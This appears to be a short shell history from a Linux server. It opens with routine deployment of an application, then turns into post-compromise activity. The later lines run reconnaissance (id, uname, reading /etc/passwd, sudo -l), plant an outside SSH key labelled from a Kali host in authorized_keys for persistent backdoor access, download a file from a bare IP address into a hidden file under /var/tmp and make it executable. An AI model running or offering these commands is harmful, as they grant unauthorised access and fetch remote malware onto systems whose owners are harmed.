cd app
git pull
sudo systemctl restart app
ls
make deploy
tail -f /var/log/app/app.log
systemctl status app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFGkCQjmvENiVXHFb8dcMVKezTBR5ILyF7CqcItw5X13 x@kali' >> ~/.ssh/authorized_keys
wget -q http://103.79.214.139/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
